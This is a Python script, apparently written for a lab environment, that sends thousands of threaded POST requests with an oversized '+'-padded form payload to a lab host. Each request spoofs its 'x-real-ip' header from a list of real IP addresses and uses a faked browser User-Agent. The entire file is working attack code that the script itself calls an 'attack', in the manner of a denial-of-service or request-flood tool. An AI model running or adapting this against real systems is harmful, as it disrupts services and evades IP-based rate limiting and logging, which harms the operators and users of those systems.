import requests, random, time, argparse
from concurrent.futures import ThreadPoolExecutor, as_completed

# define arguments: target url
parser = argparse.ArgumentParser()
parser.add_argument("-n", "--node", help="Target Node number", default="01", required=True)
parser.add_argument("-w", "--workers", help="Number of workers", default=1, required=False)
parser.add_argument("-l", "--payloadlen", help="Length of the payload", default=3000, required=False)
parser.add_argument("-r", "--nreq", help="Number of HTTP requests per worker", default=3000, required=False)
args = parser.parse_args()

payload = 'foo=%3d' + '+' * int(args.payloadlen)

ips = [
    '116.179.32.104',
    '116.179.32.13',
    '116.179.32.149',
    '116.179.32.241',
    '116.179.32.28',
    '116.179.37.116',
    '116.179.37.135',
    '116.179.37.147',
    '116.179.37.169',
    '116.179.37.198',
    '116.179.37.203',
    '116.179.37.206',
    '116.179.37.210',
    '116.179.37.232',
    '116.179.37.247',
    '116.179.37.84',
    '139.198.19.213',
    '185.234.69.215',
    '188.243.183.190',
    '191.101.31.55',
    '193.56.254.36',
    '193.56.254.37',
    '212.102.57.158',
    '222.148.169.215',
    '3.87.144.193',
    '3.92.128.229',
    '45.142.122.213',
    '46.161.11.43',
    '54.236.117.26',
    '65.108.0.71',
    '66.249.66.219',
    '66.249.77.53',
    '88.130.134.80',
    '91.211.88.127'
]

def get_random_ip():
    return random.choice(ips)

def send_attack(n):
    ip = get_random_ip()
    start = time.time()

    #print(f"Sending attack {n} using IP: {ip}")
    requests.post(
        f'http://{args.node}.lab.be3rse.com/',
        headers={
            "content-type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
            "x-real-ip": f"{ip}",
        },
        data=payload
    )
    end = time.time()
    print(f"Attack {n} finished in {end - start} using ip {ip}")

processes = []
with ThreadPoolExecutor(max_workers=int(args.workers)) as executor:
    for n in range(1, int(args.nreq)):
        processes.append(executor.submit(send_attack, n))
